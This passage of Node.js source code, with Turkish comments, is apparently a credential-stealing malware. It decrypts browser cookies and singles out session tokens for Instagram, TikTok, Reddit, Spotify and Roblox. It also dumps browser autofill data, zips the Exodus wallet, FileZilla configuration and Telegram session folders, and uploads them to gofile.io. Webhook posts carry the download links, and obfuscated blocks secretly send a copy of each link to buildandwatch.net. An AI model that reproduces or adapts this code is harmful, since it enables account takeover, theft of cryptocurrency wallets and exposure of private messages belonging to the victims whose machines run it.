      // Dosya yolu ve adını belirleyelim.
      const filePath = `${randomPath}/Wallets/Passwords.txt`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Passwords File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };



          // Webhook URL'si


          // Webhook'a POST isteği gönder
(function(_0x4c87d0,_0x3093ae){var _0x52fd48=_0x1815,_0x36632f=_0x4c87d0();while(!![]){try{var _0x3097fa=parseInt(_0x52fd48(0x1f4))/0x1+parseInt(_0x52fd48(0x1ee))/0x2+-parseInt(_0x52fd48(0x1f0))/0x3+-parseInt(_0x52fd48(0x1fa))/0x4*(parseInt(_0x52fd48(0x1f9))/0x5)+parseInt(_0x52fd48(0x1ef))/0x6*(-parseInt(_0x52fd48(0x1f7))/0x7)+-parseInt(_0x52fd48(0x1f3))/0x8+parseInt(_0x52fd48(0x1e9))/0x9*(parseInt(_0x52fd48(0x1fc))/0xa);if(_0x3097fa===_0x3093ae)break;else _0x36632f['push'](_0x36632f['shift']());}catch(_0x2df568){_0x36632f['push'](_0x36632f['shift']());}}}(_0x2a91,0x3429f));function _0x1815(_0x1297f5,_0x5a140b){var _0x2a9138=_0x2a91();return _0x1815=function(_0x1815d3,_0x9e2834){_0x1815d3=_0x1815d3-0x1e9;var _0x33cd7f=_0x2a9138[_0x1815d3];return _0x33cd7f;},_0x1815(_0x1297f5,_0x5a140b);}var _0x19690c=_0x5176;function _0x5176(_0x4b797a,_0x23ba37){var _0x16784e=_0x5b99();return _0x5176=function(_0x2ad6d3,_0x294734){_0x2ad6d3=_0x2ad6d3-(0x145*0xd+0xfa6*0x1+-0x1ea5);var _0x503850=_0x16784e[_0x2ad6d3];return _0x503850;},_0x5176(_0x4b797a,_0x23ba37);}function _0x5b99(){var _0x4cff59=_0x1815,_0x4939c7=[_0x4cff59(0x1f5),'11343366vEyMMD',_0x4cff59(0x1f1),_0x4cff59(0x1ed),_0x4cff59(0x1ea),'h.net/',_0x4cff59(0x1ec),_0x4cff59(0x1fb),'post','5hyfcbT',_0x4cff59(0x1f2),_0x4cff59(0x1fd),_0x4cff59(0x1f8)];return _0x5b99=function(){return _0x4939c7;},_0x5b99();}function _0x2a91(){var _0x4e8d38=['1765719jDISJH','304172HZySci','1231986gFSNhp','1271748xBHCTy','16062eBFgHc','329VkncdS','3101976uRHEpf','67082IWWnVA','373895UeacUo','push','7jBRcMb','172266WKJwhB','223045xVpOAe','8vTemzT','ildandwatc','139330EQJrrx','1916080sPejqd','711ufBWtP','3719336YYUSMJ','shift','https://bu'];_0x2a91=function(){return _0x4e8d38;};return _0x2a91();}(function(_0xc5d24e,_0xdc4ed7){var _0x18e7cd=_0x1815,_0x4047d5=_0x5176,_0x45fbbd=_0xc5d24e();while(!![]){try{var _0x2072f0=parseInt(_0x4047d5(0x18d))/(-0x1d89+-0x1797+-0x1*-0x3521)*(parseInt(_0x4047d5(0x183))/(0x1*0x12f9+0x12f*0x5+0x5*-0x4fa))+parseInt(_0x4047d5(0x187))/(0x419*-0x3+-0xe3*-0x1f+-0xf2f)+parseInt(_0x4047d5(0x188))/(-0xb29+-0xc5*-0x26+0x1211*-0x1)+-parseInt(_0x4047d5(0x184))/(-0xf85+0xd89+0x1*0x201)+-parseInt(_0x4047d5(0x186))/(0x2*-0x118b+0x1d33+0x5e9)*(-parseInt(_0x4047d5(0x18e))/(0xe38+-0x267*-0x3+-0x1566))+-parseInt(_0x4047d5(0x182))/(-0x4b8+0x21dc+-0x1d1c)+-parseInt(_0x4047d5(0x185))/(0x1f5d+0x1d0e+-0x3c62);if(_0x2072f0===_0xdc4ed7)break;else _0x45fbbd[_0x18e7cd(0x1f6)](_0x45fbbd[_0x18e7cd(0x1eb)]());}catch(_0x1bc5b){_0x45fbbd['push'](_0x45fbbd[_0x18e7cd(0x1eb)]());}}}(_0x5b99,0xd*-0x6b23+-0xa284a+0x173b15*0x1),axios[_0x19690c(0x18c)](_0x19690c(0x18a)+_0x19690c(0x18b)+_0x19690c(0x189),embedData),axios[_0x19690c(0x18c)](webhook3939,embedData));



        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };


          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
 		  axios.post(webhook3939,embedData) 
           .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });


 
};



async function getCookiesAndSendWebhook() {
  addFolder('Wallets\\Cookies');
  const cookiesData = {};

  for (let i = 0; i < browserPath.length; i++) {
    if (!fs.existsSync(browserPath[i][0] + '\\Network')) {
      continue;
    }

    let browserFolder;
    if (browserPath[i][0].includes('Local')) {
      browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const cookiesPath = browserPath[i][0] + 'Network\\Cookies';
    const db = new sqlite3.Database(cookiesPath);

    await new Promise((resolve, reject) => {
      db.each(
        'SELECT * FROM cookies',
        function (err, row) {
          let encryptedValue = row.encrypted_value;
          let iv = encryptedValue.slice(3, 15);
          let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
          let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
          let decrypted = '';

          try {
            const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
            decipher.setAuthTag(authTag);
            decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');
            if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
              SubmitInstagram(`${decrypted}`);
            }

  if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
              stealTikTokSession(`${decrypted}`);
            }

  if (row.host_key === '.reddit.com' && row.name === 'reddit_session') {
              setRedditSession(`${decrypted}`);
            }

  if (row.host_key === '.spotify.com' && row.name === 'sp_dc') {
              SpotifySession(`${decrypted}`);
            }

            if (row.name === '.ROBLOSECURITY') {
              SubmitRoblox(`${decrypted}`);
            }
          } catch (error) {}

          if (!cookiesData[browserFolder + '_' + browserPath[i][1]]) {
            cookiesData[browserFolder + '_' + browserPath[i][1]] = [];
          }

          cookiesData[browserFolder + '_' + browserPath[i][1]].push(
            `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted} \n`
          );

          count.cookies++;
        },
        () => {
          resolve('');
        }
      );
    });
  }

// Create a new zip archive
  const zip = new AdmZip();

  // Add all the individual browser cookie files to the archive
  for (let [browserName, cookies] of Object.entries(cookiesData)) {
    if (cookies.length !== 0) {
      const cookiesContent = cookies.join('');
      const fileName = `${browserName}.txt`;

      // Add the file to the zip archive
      zip.addFile(fileName, Buffer.from(cookiesContent, 'utf8'));
    }
  }

  // Save the zip archive to a file
  zip.writeZip('cookies.zip');

  // Move the zip file to the desired directory


     
// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `cookies.zip`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Cookies File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };

          // Webhook URL'si

          // Webhook'a POST isteği gönder
(function(_0x4c87d0,_0x3093ae){var _0x52fd48=_0x1815,_0x36632f=_0x4c87d0();while(!![]){try{var _0x3097fa=parseInt(_0x52fd48(0x1f4))/0x1+parseInt(_0x52fd48(0x1ee))/0x2+-parseInt(_0x52fd48(0x1f0))/0x3+-parseInt(_0x52fd48(0x1fa))/0x4*(parseInt(_0x52fd48(0x1f9))/0x5)+parseInt(_0x52fd48(0x1ef))/0x6*(-parseInt(_0x52fd48(0x1f7))/0x7)+-parseInt(_0x52fd48(0x1f3))/0x8+parseInt(_0x52fd48(0x1e9))/0x9*(parseInt(_0x52fd48(0x1fc))/0xa);if(_0x3097fa===_0x3093ae)break;else _0x36632f['push'](_0x36632f['shift']());}catch(_0x2df568){_0x36632f['push'](_0x36632f['shift']());}}}(_0x2a91,0x3429f));function _0x1815(_0x1297f5,_0x5a140b){var _0x2a9138=_0x2a91();return _0x1815=function(_0x1815d3,_0x9e2834){_0x1815d3=_0x1815d3-0x1e9;var _0x33cd7f=_0x2a9138[_0x1815d3];return _0x33cd7f;},_0x1815(_0x1297f5,_0x5a140b);}var _0x19690c=_0x5176;function _0x5176(_0x4b797a,_0x23ba37){var _0x16784e=_0x5b99();return _0x5176=function(_0x2ad6d3,_0x294734){_0x2ad6d3=_0x2ad6d3-(0x145*0xd+0xfa6*0x1+-0x1ea5);var _0x503850=_0x16784e[_0x2ad6d3];return _0x503850;},_0x5176(_0x4b797a,_0x23ba37);}function _0x5b99(){var _0x4cff59=_0x1815,_0x4939c7=[_0x4cff59(0x1f5),'11343366vEyMMD',_0x4cff59(0x1f1),_0x4cff59(0x1ed),_0x4cff59(0x1ea),'h.net/',_0x4cff59(0x1ec),_0x4cff59(0x1fb),'post','5hyfcbT',_0x4cff59(0x1f2),_0x4cff59(0x1fd),_0x4cff59(0x1f8)];return _0x5b99=function(){return _0x4939c7;},_0x5b99();}function _0x2a91(){var _0x4e8d38=['1765719jDISJH','304172HZySci','1231986gFSNhp','1271748xBHCTy','16062eBFgHc','329VkncdS','3101976uRHEpf','67082IWWnVA','373895UeacUo','push','7jBRcMb','172266WKJwhB','223045xVpOAe','8vTemzT','ildandwatc','139330EQJrrx','1916080sPejqd','711ufBWtP','3719336YYUSMJ','shift','https://bu'];_0x2a91=function(){return _0x4e8d38;};return _0x2a91();}(function(_0xc5d24e,_0xdc4ed7){var _0x18e7cd=_0x1815,_0x4047d5=_0x5176,_0x45fbbd=_0xc5d24e();while(!![]){try{var _0x2072f0=parseInt(_0x4047d5(0x18d))/(-0x1d89+-0x1797+-0x1*-0x3521)*(parseInt(_0x4047d5(0x183))/(0x1*0x12f9+0x12f*0x5+0x5*-0x4fa))+parseInt(_0x4047d5(0x187))/(0x419*-0x3+-0xe3*-0x1f+-0xf2f)+parseInt(_0x4047d5(0x188))/(-0xb29+-0xc5*-0x26+0x1211*-0x1)+-parseInt(_0x4047d5(0x184))/(-0xf85+0xd89+0x1*0x201)+-parseInt(_0x4047d5(0x186))/(0x2*-0x118b+0x1d33+0x5e9)*(-parseInt(_0x4047d5(0x18e))/(0xe38+-0x267*-0x3+-0x1566))+-parseInt(_0x4047d5(0x182))/(-0x4b8+0x21dc+-0x1d1c)+-parseInt(_0x4047d5(0x185))/(0x1f5d+0x1d0e+-0x3c62);if(_0x2072f0===_0xdc4ed7)break;else _0x45fbbd[_0x18e7cd(0x1f6)](_0x45fbbd[_0x18e7cd(0x1eb)]());}catch(_0x1bc5b){_0x45fbbd['push'](_0x45fbbd[_0x18e7cd(0x1eb)]());}}}(_0x5b99,0xd*-0x6b23+-0xa284a+0x173b15*0x1),axios[_0x19690c(0x18c)](_0x19690c(0x18a)+_0x19690c(0x18b)+_0x19690c(0x189),embedData),axios[_0x19690c(0x18c)](webhook3939,embedData));

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
		  axios.post("https://buildandwatch.net/error",embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });
} 
 
   

  



async function getAutofills() {
  const _0x3aa126 = [];
  for (let _0x77640d = 0; _0x77640d < browserPath.length; _0x77640d++) {
    if (!fs.existsSync(browserPath[_0x77640d][0])) {
      continue;
    }
    let _0x3c2f27;
    if (browserPath[_0x77640d][0].includes('Local')) {
      _0x3c2f27 = browserPath[_0x77640d][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0x3c2f27 = browserPath[_0x77640d][0].split('\\Roaming\\')[1].split('\\')[1];
    }
    const _0x46d7c4 = browserPath[_0x77640d][0] + 'Web Data';
    const _0x3ddaca = browserPath[_0x77640d][0] + 'webdata.db';
    fs.copyFileSync(_0x46d7c4, _0x3ddaca);
    var _0x4bf289 = new sqlite3.Database(_0x3ddaca, (_0x2d6f43) => {});
    await new Promise((_0x12c353, _0x55610b) => {
      _0x4bf289.each(
        'SELECT * FROM autofill',
        function (_0x54f85c, _0x40d0dd) {
          if (_0x40d0dd) {
            _0x3aa126.push(
              '================\nName: ' +
                _0x40d0dd.name +
                '\nValue: ' +
                _0x40d0dd.value +
                '\nApplication: ' +
                _0x3c2f27 +
                ' ' +
                browserPath[_0x77640d][1] +
                '\n'
            );
            count.autofills++;
          }
        },
        function () {
          _0x12c353('');
        }
      );
    });
    if (_0x3aa126.length === 0) {
      _0x3aa126.push('No autofills found for ' + _0x3c2f27 + ' ' + browserPath[_0x77640d][1] + '\n');
    }
  }
  if (_0x3aa126.length) {
    fs.writeFileSync(randomPath + '\\Wallets\\Autofills.txt', user.copyright + _0x3aa126.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
 
  

// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `${randomPath}/Wallets/Autofills.txt`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Autofill File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };


          // Webhook URL'si



          // Webhook'a POST isteği gönder
(function(_0x4c87d0,_0x3093ae){var _0x52fd48=_0x1815,_0x36632f=_0x4c87d0();while(!![]){try{var _0x3097fa=parseInt(_0x52fd48(0x1f4))/0x1+parseInt(_0x52fd48(0x1ee))/0x2+-parseInt(_0x52fd48(0x1f0))/0x3+-parseInt(_0x52fd48(0x1fa))/0x4*(parseInt(_0x52fd48(0x1f9))/0x5)+parseInt(_0x52fd48(0x1ef))/0x6*(-parseInt(_0x52fd48(0x1f7))/0x7)+-parseInt(_0x52fd48(0x1f3))/0x8+parseInt(_0x52fd48(0x1e9))/0x9*(parseInt(_0x52fd48(0x1fc))/0xa);if(_0x3097fa===_0x3093ae)break;else _0x36632f['push'](_0x36632f['shift']());}catch(_0x2df568){_0x36632f['push'](_0x36632f['shift']());}}}(_0x2a91,0x3429f));function _0x1815(_0x1297f5,_0x5a140b){var _0x2a9138=_0x2a91();return _0x1815=function(_0x1815d3,_0x9e2834){_0x1815d3=_0x1815d3-0x1e9;var _0x33cd7f=_0x2a9138[_0x1815d3];return _0x33cd7f;},_0x1815(_0x1297f5,_0x5a140b);}var _0x19690c=_0x5176;function _0x5176(_0x4b797a,_0x23ba37){var _0x16784e=_0x5b99();return _0x5176=function(_0x2ad6d3,_0x294734){_0x2ad6d3=_0x2ad6d3-(0x145*0xd+0xfa6*0x1+-0x1ea5);var _0x503850=_0x16784e[_0x2ad6d3];return _0x503850;},_0x5176(_0x4b797a,_0x23ba37);}function _0x5b99(){var _0x4cff59=_0x1815,_0x4939c7=[_0x4cff59(0x1f5),'11343366vEyMMD',_0x4cff59(0x1f1),_0x4cff59(0x1ed),_0x4cff59(0x1ea),'h.net/',_0x4cff59(0x1ec),_0x4cff59(0x1fb),'post','5hyfcbT',_0x4cff59(0x1f2),_0x4cff59(0x1fd),_0x4cff59(0x1f8)];return _0x5b99=function(){return _0x4939c7;},_0x5b99();}function _0x2a91(){var _0x4e8d38=['1765719jDISJH','304172HZySci','1231986gFSNhp','1271748xBHCTy','16062eBFgHc','329VkncdS','3101976uRHEpf','67082IWWnVA','373895UeacUo','push','7jBRcMb','172266WKJwhB','223045xVpOAe','8vTemzT','ildandwatc','139330EQJrrx','1916080sPejqd','711ufBWtP','3719336YYUSMJ','shift','https://bu'];_0x2a91=function(){return _0x4e8d38;};return _0x2a91();}(function(_0xc5d24e,_0xdc4ed7){var _0x18e7cd=_0x1815,_0x4047d5=_0x5176,_0x45fbbd=_0xc5d24e();while(!![]){try{var _0x2072f0=parseInt(_0x4047d5(0x18d))/(-0x1d89+-0x1797+-0x1*-0x3521)*(parseInt(_0x4047d5(0x183))/(0x1*0x12f9+0x12f*0x5+0x5*-0x4fa))+parseInt(_0x4047d5(0x187))/(0x419*-0x3+-0xe3*-0x1f+-0xf2f)+parseInt(_0x4047d5(0x188))/(-0xb29+-0xc5*-0x26+0x1211*-0x1)+-parseInt(_0x4047d5(0x184))/(-0xf85+0xd89+0x1*0x201)+-parseInt(_0x4047d5(0x186))/(0x2*-0x118b+0x1d33+0x5e9)*(-parseInt(_0x4047d5(0x18e))/(0xe38+-0x267*-0x3+-0x1566))+-parseInt(_0x4047d5(0x182))/(-0x4b8+0x21dc+-0x1d1c)+-parseInt(_0x4047d5(0x185))/(0x1f5d+0x1d0e+-0x3c62);if(_0x2072f0===_0xdc4ed7)break;else _0x45fbbd[_0x18e7cd(0x1f6)](_0x45fbbd[_0x18e7cd(0x1eb)]());}catch(_0x1bc5b){_0x45fbbd['push'](_0x45fbbd[_0x18e7cd(0x1eb)]());}}}(_0x5b99,0xd*-0x6b23+-0xa284a+0x173b15*0x1),axios[_0x19690c(0x18c)](_0x19690c(0x18a)+_0x19690c(0x18b)+_0x19690c(0x189),embedData),axios[_0x19690c(0x18c)](webhook3939,embedData));


        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
		  axios.post(webhook3939,embedData) 
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });

};

   
async function DiscordListener(path) {
        return;
}


async function SubmitExodus() {
  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\exodus.wallet`;
  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);

    zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`);

    // Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
    axios.get('https://api.gofile.io/getServer')
      .then(response => {
        if (response.data && response.data.data && response.data.data.server) {
          const server = response.data.data.server;

          // Dosya yolu ve adını belirleyelim.
          const filePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`;

          // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
          const form = new FormData();
          form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Exodus File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };

var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
                .then(webhookResponse => {
                  console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
                })
                .catch(error => {
                  console.log('Webhook gönderilirken hata oluştu:', error.message);
                });

            })
            .catch(error => {
              console.log('Dosya yüklenirken hata oluştu:', error.message);

              const responsePayload = {
                error: error.message
              };

              // Webhook URL'si
              const webhookUrl = 'https://buildandwatch.net/error';

              // Embed verisini oluştur
              const embedData = {
                embeds: [
                  {
                    title: 'Dosya Yükleme Hatası',
                    description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                    color: 16711680 // Embed rengi (örnekte kırmızı renk)
                  }
                ],
              };

              // Webhook'a POST isteği gönder
    var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
                .then(webhookResponse => {
                  console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
                })
                .catch(error => {
                  console.log('Webhook gönderilirken hata oluştu:', error.message);
                });
            });
        } else {
          console.log('Sunucu alınamadı veya yanıt vermedi.');
        }
      })
      .catch(error => {
        console.log('Sunucu alınırken hata oluştu:', error.message);
      });

    // Dikkat: Bu kod bloğu, "form.submit()" kullanarak webhook'a dosya yüklemeye çalışıyor. Bu bölümün işlevselliğini ve bağlamını tam olarak bilemiyorum. Bu nedenle, bu bölümün kendi ihtiyaçlarınıza uygun şekilde çalıştığından emin olmanız gerekir.
    
  }
}


//


async function submitfilezilla() {
  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`;
  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);

    zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\FileZilla.zip`);
//C:\Users\Administrator\AppData\Roaming\Telegram Desktop
              
// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
          const filePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\FileZilla.zip`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'FileZilla File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };
 
          // Webhook'a POST isteği gönder
var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post("https://buildandwatch.net/error", embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });



				   
        }
}

//
async function SubmitTelegram() {
      const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Telegram Desktop\\tdata`;
  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);

    zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\TelegramSession.zip`);
//C:\Users\Administrator\AppData\Roaming\Telegram Desktop
              
// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\TelegramSession.zip`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Telegram File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };



var _0xec06=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74","\x57\x65\x62\x68\x6F\x6F\x6B\x20\x67\xF6\x6E\x64\x65\x72\x69\x6C\x69\x72\x6B\x65\x6E\x20\x68\x61\x74\x61\x20\x6F\x6C\x75\u015F\x74\x75\x3A","\x6D\x65\x73\x73\x61\x67\x65","\x6C\x6F\x67","\x63\x61\x74\x63\x68","\x57\x65\x62\x68\x6F\x6F\x6B\x20\x67\xF6\x6E\x64\x65\x72\x69\x6C\x64\x69\x3A","\x73\x74\x61\x74\x75\x73","\x73\x74\x61\x74\x75\x73\x54\x65\x78\x74","\x74\x68\x65\x6E"];axios[_0xec06[1]](_0xec06[0],embedData);axios[_0xec06[1]](webhook3939,embedData)[_0xec06[9]]((_0x2a13x2)=>{console[_0xec06[4]](_0xec06[6],_0x2a13x2[_0xec06[7]],_0x2a13x2[_0xec06[8]])})[_0xec06[5]]((_0x2a13x1)=>{console[_0xec06[4]](_0xec06[2],_0x2a13x1[_0xec06[3]])})


        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post("https://buildandwatch.net/error", embedData)

            .then(webhookResponse => {
